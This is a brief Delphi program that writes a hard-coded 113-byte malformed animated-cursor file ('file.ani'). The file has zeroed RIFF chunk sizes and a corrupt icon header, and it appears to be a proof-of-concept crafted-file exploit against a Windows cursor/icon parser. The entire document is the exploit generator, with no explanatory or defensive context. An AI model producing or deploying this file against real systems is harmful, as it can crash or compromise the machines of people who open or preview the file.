 program ani;
 {$APPTYPE CONSOLE}
 const
   FileName='file.ani';
   Len=113;
   Buf=#$52#$49#$46#$46#$00#$00#$00#$00#$41#$43#$4F#$4E#$00#$00#$00#$00#$24#$00+
   #$00#$00#$24#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
   #$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
   #$4C#$49#$53#$54#$00#$00#$00#$00#$66#$72#$61#$6D#$69#$63#$6F#$6E#$00#$00#$00+
   #$00#$00#$00#$00#$00#$01#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$02#$00+
   #$16#$00#$00#$00#$28#$00#$00#$00#$FF#$FF#$FF#$00#$02#$00#$00#$00#$00#$00#$01;
 var
   F:File;
   I:Byte;
 begin
   AssignFile(F,FileName);
   Rewrite(F,1);
   BlockWrite(F, Buf, Len);
   CloseFile(F);
 end.
